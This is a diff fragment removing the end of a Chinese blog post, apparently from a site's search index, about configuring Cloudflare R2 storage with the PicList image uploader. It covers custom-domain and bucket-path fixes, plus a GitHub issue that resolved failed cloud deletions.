-<p>地区因为选择亚太地区所有填写 apac</p>
-<p><strong>自定义域名写刚刚的三级域名如:<a href="http://image.a.com/">http://image.a.com</a></strong></p>
-<hr>
-<h3 id="踩坑原因"><a href="#踩坑原因" class="headerlink" title="踩坑原因"></a>踩坑原因</h3><p>之前设置<strong>PicList</strong>自定义节点使用了这个 S3 API，它其实和上图管辖地址只差一个存储桶的名字 </p>
-<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628153202851.png" alt="image-20240628153202851"></p>
-<p>而且可以上传图片，但是图片在typora加载会失败</p>
-<p>随后将<strong>PicList</strong>自定义域名<a href="http://image.a.com,改为http//image.a.com/blog1">http://image.a.com，改为http://image.a.com/blog1</a></p>
-<p>图片显示正常</p>
-<p>用了一段时间才发现<strong>PicList</strong>不能同步删除云端图片，看日志没有看到删除记录</p>
-<p>最开始谷歌半天找不到原因，随后找到这个issuse:<a href="https://github.com/Kuingsmile/PicList/issues/203%E6%89%8D%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98">https://github.com/Kuingsmile/PicList/issues/203才解决这个问题</a></p>
-<p>随后<strong>PicList</strong>也可以正常的删除云端的图片了</p>
-<p><strong>(浪费贼多时间去谷歌，看来下次遇到问题得先去看issuse)</strong></p>
-<h2 id="🤗Enjoy！"><a href="#🤗Enjoy！" class="headerlink" title="🤗Enjoy！"></a>🤗Enjoy！</h2><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://developers.cloudflare.com/r2/">Cloudflare R2 · Cloudflare R2 docs</a></p>
-<p><a href="https://github.com/Kuingsmile/PicList/issues/203">Bug无法同步删除云端 #203</a></p>
-<p><a href="https://piclist.cn/app">PicList文档</a></p>
-]]></content>
-      <categories>
-        <category>奇技淫巧</category>
-      </categories>
-      <tags>
-        <tag>奇技淫巧</tag>
       </tags>
   </entry>
 </search>
